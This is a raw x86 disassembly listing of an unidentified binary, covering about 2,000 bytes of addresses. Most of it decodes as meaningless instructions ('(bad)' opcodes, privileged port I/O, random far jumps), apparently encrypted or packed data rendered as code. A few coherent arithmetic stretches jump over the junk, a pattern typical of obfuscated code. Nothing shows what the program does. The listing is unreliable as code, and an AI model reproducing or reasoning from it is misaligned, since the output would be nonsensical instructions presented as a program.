  4129c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c6:	(bad)  
  4129c7:	into   
  4129c8:	fs mov cl,0x71
  4129cb:	mov    bh,0x54
  4129cd:	xor    al,0x4
  4129cf:	and    eax,0x403a3669
  4129d4:	pusha  
  4129d5:	sahf   
  4129d6:	xchg   esp,eax
  4129d7:	adc    DWORD PTR [ebx+0x1895dc1e],ebp
  4129dd:	add    bl,cl
  4129df:	icebp  
  4129e0:	popf   
  4129e1:	xor    dl,BYTE PTR [eax]
  4129e3:	ret    0xe5b8
  4129e6:	adc    edi,ebp
  4129e8:	cmp    DWORD PTR [ebx],eax
  4129ea:	adc    dh,BYTE PTR [ebx*8+0x75ce2c6d]
  4129f1:	and    bx,WORD PTR [esi+0x68]
  4129f5:	test   al,0xc6
  4129f7:	mov    eax,0x8b23a423
  4129fc:	push   ds
  4129fd:	mov    esp,0x934fe67f
  412a02:	mov    dl,BYTE PTR [edi]
  412a04:	aam    0x95
  412a06:	inc    esi
  412a07:	in     eax,0x9a
  412a09:	and    bl,BYTE PTR [edi]
  412a0b:	pop    ecx
  412a0c:	pop    esp
  412a0d:	ss dec esi
  412a0f:	mov    bh,0x60
  412a11:	fucomip st,st(7)
  412a13:	adc    BYTE PTR gs:[ebp-0x797b6fc5],bh
  412a1a:	xchg   edi,eax
  412a1b:	mov    ah,0x7d
  412a1d:	add    eax,0x8a89565d
  412a22:	rcr    DWORD PTR [edx+edi*2-0x6e],0xe4
  412a27:	shr    bh,cl
  412a29:	std    
  412a2a:	retf   0x2c47
  412a2d:	xchg   esi,eax
  412a2e:	and    eax,0x1e5d4fe
  412a33:	xchg   BYTE PTR [edi+ebx*1],ch
  412a36:	arpl   bx,sp
  412a38:	mov    bh,al
  412a3a:	pop    es
  412a3b:	cmc    
  412a3c:	mov    ch,0xee
  412a3e:	sub    eax,0x35b6f234
  412a43:	popf   
  412a44:	xchg   edx,eax
  412a45:	outs   dx,DWORD PTR ds:[esi]
  412a46:	(bad)  
  412a47:	into   
  412a48:	jge    0x412a33
  412a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a4b:	test   eax,0xfae3144a
  412a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a51:	cdq    
  412a52:	test   DWORD PTR ds:[ecx+0x465b771d],edi
  412a59:	ins    BYTE PTR es:[edi],dx
  412a5a:	jmp    0x771a:0x47521d39
  412a61:	imul   ecx,DWORD PTR [ebx],0x7d
  412a64:	mov    edx,0x1ecc81ab
  412a69:	push   0x72
  412a6b:	push   ebx
  412a6c:	inc    esp
  412a6d:	and    BYTE PTR [edi],cl
  412a6f:	enter  0xd3a4,0x31
  412a73:	pop    ds
  412a74:	fs sahf 
  412a76:	(bad)  
  412a77:	in     eax,dx
  412a78:	cs popa 
  412a7a:	call   0xef6e9981
  412a7f:	jo     0x412a7a
  412a81:	cdq    
  412a82:	iret   
  412a83:	gs pop es
  412a85:	push   ebx
  412a86:	mov    edx,DWORD PTR [eax]
  412a88:	xor    eax,0x3b260d51
  412a8d:	cmp    al,0xb6
  412a8f:	leave  
  412a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a91:	sbb    esi,DWORD PTR [ebp+0x40faad7]
  412a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a99:	mov    ah,0xa9
  412a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a9c:	mov    ah,0x8c
  412a9e:	and    BYTE PTR ds:0x450ec532,bl
  412aa4:	and    al,0x13
  412aa6:	mov    edx,0xe151dcf9
  412aab:	mov    cl,0x11
  412aad:	ret    
  412aae:	lds    eax,FWORD PTR [esi]
  412ab0:	(bad)  
  412ab1:	mov    ebx,0x3d7960b3
  412ab6:	dec    BYTE PTR [edx+0x693fddaa]
  412abc:	pop    DWORD PTR ds:0x6a01c210
  412ac2:	pop    edx
  412ac3:	imul   edi,DWORD PTR [edx+0x51271552],0xc744107e
  412acd:	ds cs loopne 0x412a9a
  412ad1:	sbb    cl,bl
  412ad3:	(bad)  
  412ad5:	cmp    DWORD PTR [ebp+0x53],0x3f565709
  412adc:	mov    ebx,0x110a0f23
  412ae1:	sahf   
  412ae2:	test   DWORD PTR [edi+0x1f],ecx
  412ae5:	fs jle 0x412afd
  412ae8:	test   BYTE PTR [esi+0x6ce90c54],al
  412aee:	dec    eax
  412aef:	out    0xf3,eax
  412af1:	adc    eax,0xcf8c31a0
  412af6:	ja     0x412b5e
  412af8:	sbb    BYTE PTR [ebx+edi*2-0xd],dh
  412afc:	mov    ebx,0x6151651f
  412b01:	add    al,0x8c
  412b03:	xchg   esi,eax
  412b04:	fisub  WORD PTR [esi+0x7c]
  412b07:	jle    0x412b25
  412b09:	jg     0x412aff
  412b0b:	pop    ebx
  412b0c:	inc    ecx
  412b0d:	in     eax,dx
  412b0e:	jl     0x412b87
  412b10:	bound  eax,QWORD PTR [ebp+edi*4+0x692bd17e]
  412b17:	xchg   esi,eax
  412b18:	add    edx,DWORD PTR [edi]
  412b1a:	push   0x1243f3c4
  412b1f:	or     BYTE PTR [edi],bl
  412b21:	xchg   ebp,eax
  412b22:	mov    al,ds:0xb03c4057
  412b27:	fiadd  DWORD PTR [eax-0x1f]
  412b2a:	pop    ebp
  412b2b:	mov    dl,0xc0
  412b2d:	imul   ecx,DWORD PTR [ebx+edx*4+0x3c66f748],0xd9ed5c32
  412b38:	enter  0x435b,0xdd
  412b3c:	ins    BYTE PTR es:[edi],dx
  412b3d:	cmp    cl,BYTE PTR [edx-0x53c5b81a]
  412b43:	scas   al,BYTE PTR es:[edi]
  412b44:	add    BYTE PTR [edx+ebp*4-0x7f],ah
  412b48:	lea    ebp,ds:0x44edeeff
  412b4e:	rcr    BYTE PTR [edi-0x6a],0x75
  412b52:	call   0xee28f763
  412b57:	fstp   TBYTE PTR [ebp+0x7000ac0b]
  412b5d:	leave  
  412b5e:	xor    eax,0xe9d587f7
  412b63:	out    0xb3,eax
  412b65:	mov    BYTE PTR [ebp-0x7675df10],bh
  412b6b:	push   cs
  412b6c:	jecxz  0x412b6f
  412b6e:	call   DWORD PTR [ecx]
  412b70:	bound  ecx,QWORD PTR [edx]
  412b72:	pusha  
  412b73:	cli    
  412b74:	adc    DWORD PTR [edx+0x2a],edi
  412b77:	xor    BYTE PTR [edx],bl
  412b79:	mov    ds:0x6fbfa4bd,eax
  412b7e:	movntps XMMWORD PTR [ebp-0x35a6e47],xmm6
  412b85:	leave  
  412b86:	add    ebp,esi
  412b88:	cli    
  412b89:	jp     0x412b67
  412b8b:	xchg   BYTE PTR [edx-0x53033f73],bh
  412b91:	sahf   
  412b92:	push   eax
  412b93:	repz int3 
  412b95:	scas   eax,DWORD PTR es:[edi]
  412b96:	dec    edx
  412b97:	lea    edx,[edx+edi*4]
  412b9a:	pop    ebp
  412b9b:	add    eax,0x576eef63
  412ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba1:	xor    dl,BYTE PTR ds:0x9d018024
  412ba7:	or     bl,BYTE PTR [ecx+0x75459f7d]
  412bad:	fisub  DWORD PTR fs:[eax+0x31]
  412bb1:	cmp    ah,BYTE PTR [esi+edi*1-0x5d73ac76]
  412bb8:	out    0xf5,eax
  412bba:	sahf   
  412bbb:	cli    
  412bbc:	push   es
  412bbd:	dec    eax
  412bbe:	inc    esp
  412bbf:	loope  0x412c36
  412bc1:	inc    edi
  412bc2:	(bad)  
  412bc3:	adc    DWORD PTR [edi],edx
  412bc5:	sub    al,0xd3
  412bc7:	sbb    DWORD PTR [eax],edi
  412bc9:	xchg   esi,eax
  412bca:	add    edx,0x87cf5928
  412bd0:	mov    bl,0xf
  412bd2:	or     al,0xf
  412bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd5:	jmp    0x7186cec9
  412bda:	push   ebx
  412bdb:	dec    ebx
  412bdc:	jg     0x412b6c
  412bde:	ss sahf 
  412be0:	adc    esi,eax
  412be2:	(bad)  
  412be3:	idiv   bh
  412be5:	retf   0xf877
  412be8:	cmp    DWORD PTR [edi],esp
  412bea:	sbb    eax,0xa547ba57
  412bef:	call   0x3692:0x8a51c375
  412bf6:	lods   al,BYTE PTR ds:[esi]
  412bf7:	xchg   esi,eax
  412bf8:	pop    ds
  412bf9:	test   eax,0x65b247f7
  412bfe:	cli    
  412bff:	xor    edx,DWORD PTR [ebp-0x5b]
  412c02:	ror    BYTE PTR [ebp-0x5df29517],1
  412c08:	push   es
  412c09:	and    BYTE PTR [ecx-0x7e],ch
  412c0c:	adc    esi,ebp
  412c0e:	adc    eax,0xa0137b6d
  412c13:	xor    eax,0x7b9d8365
  412c18:	jb     0x412c97
  412c1a:	loop   0x412bb1
  412c1c:	dec    edi
  412c1d:	(bad)  
  412c1f:	mov    esp,0xaeb705e7
  412c24:	pop    ds
  412c25:	repnz mov bh,BYTE PTR [esi]
  412c28:	sub    dh,BYTE PTR [esi-0x4a28b851]
  412c2e:	sbb    bl,BYTE PTR [ecx]
  412c30:	mov    esp,0xc75c0f24
  412c35:	arpl   sp,bx
  412c37:	mov    esi,0xf1951765
  412c3c:	in     al,0x95
  412c3e:	inc    edx
  412c3f:	scas   al,BYTE PTR es:[edi]
  412c40:	add    cl,BYTE PTR [esi+esi*8-0xe]
  412c44:	add    al,0x5d
  412c46:	pop    ss
  412c47:	push   cs
  412c48:	push   ebx
  412c49:	pop    edi
  412c4a:	pop    ds
  412c4b:	test   eax,0xf4ba8bb1
  412c50:	pusha  
  412c51:	retf   0x8d04
  412c54:	sbb    bh,BYTE PTR [esi-0x513874c7]
  412c5a:	fidivr DWORD PTR [eax]
  412c5c:	sub    eax,0x5b0c0159
  412c61:	fnstsw WORD PTR [edx+0x3188f98e]
  412c67:	add    al,0x9e
  412c69:	fdiv   DWORD PTR [esi]
  412c6b:	lods   eax,DWORD PTR ds:[esi]
  412c6c:	pop    ebp
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xaa238274
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [eax-0x4a],dl
  412caf:	inc    esi
  412cb0:	daa    
  412cb1:	mov    ebp,ebp
  412cb3:	pop    edx
  412cb4:	pop    ebp
  412cb5:	(bad)  
  412cb6:	jne    0x412d06
  412cb8:	(bad)  
  412cb9:	pop    edi
  412cba:	stc    
  412cbb:	shr    BYTE PTR [ebp-0x699e0eab],0x67
  412cc2:	and    eax,0x6a996f9c
  412cc7:	mov    dl,0xef
  412cc9:	dec    edx
  412cca:	fstp   DWORD PTR [edi]
  412ccc:	mov    eax,0x85623b74
  412cd1:	sbb    ecx,0x52c61c27
  412cd7:	push   edx
  412cd8:	push   0x15a66a2
  412cdd:	jg     0x412ce0
  412cdf:	dec    ebp
  412ce0:	and    BYTE PTR [edi],bh
  412ce2:	sub    dl,cl
  412ce4:	cmp    ch,dh
  412ce6:	dec    edx
  412ce7:	push   ss
  412ce8:	jmp    0x412c71
  412cea:	call   0xc1b71b7f
  412cef:	je     0x412d4d
  412cf1:	rcl    BYTE PTR [ecx-0x3bf5365c],cl
  412cf7:	mov    ecx,0x8ede0a8d
  412cfc:	sbb    ebx,edi
  412cfe:	xchg   esp,eax
  412cff:	inc    eax
  412d00:	xor    al,0x3e
  412d02:	aaa    
  412d03:	cmp    ebp,esi
  412d05:	sbb    bh,BYTE PTR [ebx+0x181c7d0]
  412d0b:	sub    eax,0x2979a597
  412d10:	icebp  
  412d11:	mov    esp,0x4d04ca0c
  412d16:	setno  BYTE PTR [eax-0x80]
  412d1a:	jo     0x412d46
  412d1c:	xor    DWORD PTR [ecx],ebp
  412d1e:	call   0x3857:0x88329eff
  412d25:	jae    0x817c3637
  412d2b:	xor    BYTE PTR [edx+ebp*4-0xcc3f40e],bh
  412d32:	ret    
  412d33:	rcl    DWORD PTR [ebx+0x59b0ed44],0xe3
  412d3a:	xchg   edx,eax
  412d3b:	test   eax,0xa8e7cc59
  412d40:	and    DWORD PTR [esi-0x6d],ecx
  412d43:	inc    ebp
  412d44:	aaa    
  412d45:	jbe    0x412d55
  412d47:	push   ds
  412d48:	mov    esp,0x907890ed
  412d4d:	mov    esi,0xf35d6563
  412d52:	sbb    eax,DWORD PTR [esi-0x5abebe5c]
  412d58:	lods   al,BYTE PTR ds:[esi]
  412d59:	aad    0x64
  412d5b:	daa    
  412d5c:	aas    
  412d5d:	shr    BYTE PTR [ebp+0x42be7214],1
  412d63:	mov    esp,0xb61fcac4
  412d68:	nop
  412d69:	loop   0x412d87
  412d6b:	or     bh,BYTE PTR [edx+edx*2]
  412d6e:	retf   
  412d6f:	mov    esp,ebx
  412d71:	stos   BYTE PTR es:[edi],al
  412d72:	push   ss
  412d73:	test   eax,0xc5c1e704
  412d78:	add    eax,0x5ef46e7f
  412d7d:	mov    ds:0xd8f893d4,eax
  412d82:	pop    ebx
  412d83:	push   edi
  412d84:	(bad)  
  412d85:	mov    esp,0x337ddc6d
  412d8a:	inc    ebx
  412d8b:	pcmpgtd mm2,mm3
  412d8e:	mov    bh,0xed
  412d90:	mov    ds:0xbeee1aee,eax
  412d95:	pushf  
  412d96:	and    eax,0xa599f1fa
  412d9b:	sti    
  412d9c:	shr    BYTE PTR [ebp+0x6ac32a4a],cl
  412da2:	pop    eax
  412da3:	hlt    
  412da4:	nop
  412da5:	cld    
  412da6:	mov    eax,0x40daaf4f
  412dab:	or     DWORD PTR [ebp+0x18722f84],0x130d1f17
  412db5:	pop    es
  412db6:	sub    bh,BYTE PTR [ecx]
  412db8:	data16 jp 0x412d7c
  412dbb:	mov    esp,0xf9d2f6c3
  412dc0:	dec    edx
  412dc1:	into   
  412dc2:	int    0x2c
  412dc4:	mov    bh,0x9f
  412dc6:	pushf  
  412dc7:	jge    0x412d96
  412dc9:	aad    0x7d
  412dcb:	imul   eax,DWORD PTR [edi+0x11d1aff4],0xd1907d2a
  412dd5:	and    BYTE PTR ds:0x86757a8a,dl
  412ddb:	or     al,0x59
  412ddd:	and    DWORD PTR [edi+0x63],0xffffffdb
  412de1:	fild   DWORD PTR [esi+0x11]
  412de4:	sub    edx,DWORD PTR [esi+ebp*4]
  412de7:	(bad)  
  412de8:	pop    ebp
  412de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412deb:	mov    bh,0x7f
  412ded:	adc    al,0xeb
  412def:	dec    eax
  412df0:	mov    ecx,0x63c9d529
  412df5:	sbb    eax,0x38717842
  412dfa:	sbb    al,0xcf
  412dfc:	pushf  
  412dfd:	mov    dl,0xd2
  412dff:	adc    ch,dl
  412e01:	or     DWORD PTR [esi+ecx*4],esi
  412e04:	pop    es
  412e05:	cld    
  412e06:	push   ecx
  412e07:	outs   dx,BYTE PTR ds:[esi]
  412e08:	scas   eax,DWORD PTR es:[edi]
  412e09:	push   0xd0d7b540
  412e0e:	neg    DWORD PTR [ebx+0x259fbb0f]
  412e14:	jns    0x412dd2
  412e16:	iret   
  412e17:	add    BYTE PTR [ebx+0x3c39153],0x68
  412e1e:	mov    esi,0xcc2f3f04
  412e23:	push   esp
  412e24:	and    cl,bh
  412e26:	adc    al,0xc2
  412e28:	outs   dx,DWORD PTR ds:[esi]
  412e29:	ins    DWORD PTR es:[edi],dx
  412e2a:	sub    BYTE PTR [esi+0x23],dl
  412e2d:	mov    dh,0xf5
  412e2f:	xchg   edi,eax
  412e30:	das    
  412e31:	lds    edi,FWORD PTR [esi+0x246aa76]
  412e37:	enter  0x7727,0x84
  412e3b:	and    eax,DWORD PTR ds:0xd5a38c5d
  412e41:	dec    edx
  412e42:	dec    edx
  412e43:	or     ah,BYTE PTR [edx-0x34]
  412e46:	sti    
  412e47:	push   eax
  412e48:	in     al,0x2c
  412e4a:	pop    ebx
  412e4b:	stos   DWORD PTR es:[edi],eax
  412e4c:	mov    ds:0xbecb1c10,eax
  412e51:	test   BYTE PTR [edi+ebx*4],0x35
  412e55:	int    0xbf
  412e57:	sti    
  412e58:	dec    ecx
  412e59:	jo     0x412eda
  412e5b:	mov    edx,0x3b86bc44
  412e60:	sub    edi,DWORD PTR [edi-0x67]
  412e63:	(bad)  
  412e64:	cmc    
  412e65:	fld    QWORD PTR [esi-0x67225a75]
  412e6b:	fwait
  412e6c:	jo     0x412e04
  412e6e:	jcxz   0x412e71
  412e71:	add    al,0x92
  412e73:	dec    esi
  412e74:	add    al,0x10
  412e76:	dec    ebp
  412e77:	dec    eax
  412e78:	inc    edi
  412e79:	mov    ebx,0xbf9eb8a9
  412e7e:	out    dx,al
  412e7f:	pop    es
  412e80:	mov    edi,0xaef7727b
  412e85:	xchg   ebp,eax
  412e86:	mov    ecx,0x8d851851
  412e8b:	dec    esi
  412e8c:	xor    bh,BYTE PTR [edi+0x53]
  412e8f:	fwait
  412e90:	in     eax,0x98
  412e92:	cmp    BYTE PTR [esi+eiz*4-0x49],dh
  412e96:	dec    ecx
  412e97:	scas   al,BYTE PTR es:[edi]
  412e98:	rcr    DWORD PTR [esi+eiz*2-0x6a],cl
  412e9c:	sub    bl,BYTE PTR [ebx-0x49adeff9]
  412ea2:	fidiv  WORD PTR [eax+0x45fe4812]
  412ea8:	inc    esi
  412ea9:	and    ch,BYTE PTR [eax+0x69db33d3]
  412eaf:	cmp    BYTE PTR [edi],bh
  412eb1:	fimul  WORD PTR [esi]
  412eb3:	jp     0x412ebb
  412eb5:	pop    esp
  412eb6:	fistp  WORD PTR [ebx+0x62ca107c]
  412ebc:	add    eax,0x64b09201
  412ec1:	xchg   esi,eax
  412ec2:	add    edx,DWORD PTR [eax-0x84206c1]
  412ec8:	xor    BYTE PTR [edi],0xcc
  412ecb:	nop
  412ecc:	sub    cl,ch
  412ece:	jns    0x412ec4
  412ed0:	in     eax,dx
  412ed1:	ret    0x7573
  412ed4:	xor    edi,ecx
  412ed6:	pop    es
  412ed7:	cmp    edi,DWORD PTR [edx+0x21]
  412eda:	lods   al,BYTE PTR ds:[esi]
  412edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412edc:	xchg   esi,eax
  412edd:	mov    cl,0x75
  412edf:	js     0x412ea3
  412ee1:	jmp    0x2f0540ad
  412ee6:	repnz cmp DWORD PTR gs:[edi],edi
  412eea:	cdq    
  412eeb:	mov    ebp,0xbbcd7cd0
  412ef0:	sar    BYTE PTR [edi-0x6d],1
  412ef3:	aaa    
  412ef4:	lods   al,BYTE PTR ds:[esi]
  412ef5:	mov    esp,0x41bfa543
  412efa:	pop    edi
  412efb:	aad    0x54
  412efd:	add    eax,0x4e1787e
  412f02:	mov    eax,ds:0x1dfec0dc
  412f07:	xchg   esp,eax
  412f08:	pop    esi
  412f09:	jb     0x412ecb
  412f0b:	pop    ds
  412f0c:	mov    al,0xb0
  412f0e:	enter  0x7036,0xa2
  412f12:	sbb    ebx,DWORD PTR [edx]
  412f14:	ror    BYTE PTR [edi+edi*1+0x37],cl
  412f18:	push   ebx
  412f19:	je     0x412f42
  412f1b:	and    al,0x4a
  412f1d:	popa   
  412f1e:	(bad)  
  412f1f:	cmp    edi,ebp
  412f21:	dec    eax
  412f22:	iret   
  412f23:	mov    WORD PTR [edi-0x4691b560],gs
  412f29:	xor    eax,0x1fbf801e
  412f2e:	or     al,0xff
  412f30:	jg     0x412f5d
  412f32:	mov    al,bh
  412f34:	retf   0x1154
  412f37:	and    bh,al
  412f39:	mov    eax,0x79743ef8
  412f3e:	(bad)  
  412f3f:	int    0xe1
  412f41:	mov    ecx,0xd7916f97
  412f46:	rcl    DWORD PTR [ebx+0x1a],0x90
  412f4a:	push   cs
  412f4b:	push   ds
  412f4c:	enter  0x1b4b,0x3d
  412f50:	push   es
  412f51:	adc    BYTE PTR [ebp+0x5706840e],bl
  412f57:	out    0x14,eax
  412f59:	mov    DWORD PTR [edx],esi
  412f5b:	and    eax,DWORD PTR [eax-0x37bae17b]
  412f61:	js     0x412f12
  412f63:	sbb    eax,DWORD PTR [edi+0x77]
  412f66:	or     edx,DWORD PTR [ebx+0x68]
  412f69:	out    0xd6,al
  412f6b:	jmp    0xe94e:0x6d465ca3
  412f72:	enter  0x5ae8,0x16
  412f76:	mov    edx,0x2139a293
  412f7b:	out    dx,eax
  412f7c:	sub    bh,dh
  412f7e:	add    BYTE PTR [edx+0x23],bl
  412f81:	mov    edi,0xcdc3df0
  412f86:	or     ebp,DWORD PTR [eax+0x18336c18]
  412f8c:	push   edi
  412f8d:	(bad)  
  412f8e:	jns    0x412fcd
  412f90:	add    edi,DWORD PTR ds:0x2467dd26
  412f96:	mov    bl,0xea
  412f98:	mov    al,ds:0x30613693
  412f9d:	loope  0x412f63
  412f9f:	xchg   edx,eax
  412fa0:	jmp    ebx
  412fa2:	or     eax,0xdb8bcf14
  412fa7:	inc    esi
  412fa8:	xor    eax,0x86b97750
  412fad:	fld    QWORD PTR [edx+0x70]
  412fb0:	pop    edi
  412fb1:	push   esp
  412fb2:	fsub   DWORD PTR [ebp-0x8]
  412fb5:	xchg   ecx,eax
  412fb6:	hlt    
  412fb7:	lds    ecx,FWORD PTR [edi+0x2fa4ea39]
  412fbd:	pop    ds
  412fbe:	(bad)  
  412fc0:	inc    ebx
  412fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fc2:	aaa    
  412fc3:	and    al,0x1b
  412fc5:	xor    DWORD PTR [ecx],ebx
  412fc7:	scas   eax,DWORD PTR es:[edi]
  412fc8:	std    
  412fc9:	jae    0x412ff5
  412fcb:	add    al,0xdd
  412fcd:	inc    edx
  412fce:	lea    edx,[esp+edx*8-0x452077a4]
  412fd5:	xchg   edx,eax
  412fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fd7:	(bad)  
  412fd8:	pop    esp
  412fd9:	xchg   esi,eax
  412fda:	nop
  412fdb:	dec    ebp
  412fdc:	enter  0xbd6,0x18
  412fe0:	add    eax,0x9ab40bf
  412fe5:	mov    DWORD PTR [esi-0x65],esp
  412fe8:	repnz and edx,esp
  412feb:	xchg   ebp,eax
  412fec:	into   
  412fed:	push   es
  412fee:	dec    edi
  412fef:	sbb    DWORD PTR [ebx],edx
  412ff1:	(bad)  
  412ff2:	push   edx
  412ff3:	test   BYTE PTR [esi-0x44],bl
  412ff6:	or     BYTE PTR [esi],dl
  412ff8:	inc    edx
  412ff9:	out    0x37,eax
  412ffb:	pop    ds
  412ffc:	sub    esp,0xa0daa66c
  413002:	out    dx,al
  413003:	adc    BYTE PTR [esi-0x1a],dl
  413006:	pop    ds
  413007:	push   0xb9be0e43
  41300c:	or     ebx,edi
  41300e:	pop    esp
  41300f:	xchg   ebx,eax
  413010:	out    dx,eax
  413011:	or     esi,DWORD PTR [esi]
  413013:	cmp    al,0x98
  413015:	sub    dh,BYTE PTR ds:0x80288692
  41301b:	mov    edx,0xeaf34ece
  413020:	call   DWORD PTR [edi+ebp*1]
  413023:	and    eax,0xc72c7c0e
  413028:	js     0x412fe4
  41302a:	mov    dh,0xf1
  41302c:	cmp    DWORD PTR [ecx+0x5e],ebp
  41302f:	(bad)  
  413030:	in     eax,0x80
  413032:	ret    0x7c35
  413035:	cmp    eax,0xfc342411
  41303b:	mov    dh,BYTE PTR [eax]
  41303d:	pop    eax
  41303e:	xor    esi,DWORD PTR [ecx+0x6979b65c]
  413044:	in     al,dx
  413045:	mov    ecx,0xad7ff13f
  41304a:	sbb    cl,BYTE PTR [eax]
  41304c:	dec    edi
  41304d:	leave  
  41304e:	jb     0x4130b7
  413050:	xchg   ebp,eax
  413051:	stos   DWORD PTR es:[edi],eax
  413052:	(bad)  
  413053:	les    edx,FWORD PTR [ebx+eax*1]
  413056:	inc    eax
  413057:	addr16 dec edx
  413059:	in     eax,0x4a
  41305b:	mov    ch,0x24
  41305d:	add    al,0x4a
  41305f:	xor    BYTE PTR [ecx*4-0x69111013],bl
  413066:	xchg   esp,eax
  413067:	push   ds
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x4220ab
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [edi+edx*4-0x60],edi
  4130e0:	or     BYTE PTR [edx-0x2d],ch
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    dh,al
  4130eb:	cmp    edx,ecx
  4130ed:	sub    BYTE PTR [ebx-0xb],dh
  4130f0:	cmp    BYTE PTR [ebp+0x4a],0xfd
  4130f4:	cld    
  4130f5:	inc    esp
  4130f6:	push   edi
  4130f7:	mov    eax,ds:0xb20934b
  4130fc:	aam    0xac
  4130fe:	mov    ecx,0x823404a9
  413103:	xchg   ebp,eax
  413104:	push   ecx
  413105:	push   edi
  413106:	sub    edi,DWORD PTR [ecx-0x71]
  413109:	add    ebp,ecx
  41310b:	dec    ebx
  41310c:	inc    esi
  41310d:	mov    ecx,0x5d88982d
  413112:	adc    al,0x65
  413114:	je     0x413140
  413116:	adc    al,BYTE PTR [edi]
  413118:	enter  0x10ee,0xa7
  41311c:	push   eax
  41311d:	in     eax,0x59
  41311f:	lock mov ds:0x9a337e6f,al
  413125:	add    DWORD PTR [esi-0x21818c54],edx
  41312b:	fmul   DWORD PTR [ecx+0x49971c45]
  413131:	popf   
  413132:	jge    0x41317d
  413134:	xchg   edi,eax
  413135:	lods   eax,DWORD PTR ds:[esi]
  413136:	ds (bad) 
  413138:	pop    edi
  413139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41313a:	into   
  41313b:	cmc    
  41313c:	mov    dh,0xc3
  41313e:	cmp    esi,DWORD PTR [esi]
  413140:	jno    0x4130db
  413142:	inc    eax
  413143:	jo     0x4130df
  413145:	add    eax,0xcb4fe390
  41314a:	(bad)
  41314e:	sbb    ch,BYTE PTR [ecx+0x34]
  413151:	shr    cl,cl
  413153:	shl    DWORD PTR [ecx],cl
  413155:	dec    edx
  413156:	pop    es
  413157:	shl    DWORD PTR [edi+0x32],0x8d
  41315b:	ret    
  41315c:	dec    esp
  41315d:	call   0x7727:0xab471dc0
  413164:	dec    esi
  413165:	jp     0x4131d4
  413167:	mov    eax,0x45baddee
  41316c:	leave  
  41316d:	call   0x631b:0xcf678260
  413174:	sub    BYTE PTR [edi+0x7a0137db],cl
  41317a:	jmp    0x4131bb
  41317c:	or     dl,BYTE PTR [edi]
  41317e:	test   DWORD PTR [eax],0x38e68025
  413184:	(bad)  
  413185:	or     ah,al
  413187:	mov    WORD PTR [eax],ss
  413189:	sbb    al,0x81
  41318b:	pop    edx
  41318c:	add    ah,bh
  41318e:	inc    ebx
  41318f:	call   0xc3b6:0xe26d1333
  413196:	add    al,0x49
  413198:	jmp    0x6fb2:0x4cf4
  41319e:	test   BYTE PTR [eax],bh
  4131a0:	pop    es
  4131a1:	daa    
  4131a2:	inc    edx
  4131a3:	push   0x9
  4131a5:	inc    edx
  4131a6:	jns    0x413184
  4131a8:	ret    
  4131a9:	ds mov ebp,0x8041d5ed
  4131af:	in     al,dx
  4131b0:	xchg   ecx,eax
  4131b1:	fdivp  st(4),st
  4131b3:	retf   
  4131b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b5:	dec    edx
  4131b6:	clc    
  4131b7:	mov    ebp,0x8d148551
  4131bc:	push   ecx
  4131bd:	lods   al,BYTE PTR ds:[esi]
  4131be:	dec    eax
  4131bf:	lock pop edi
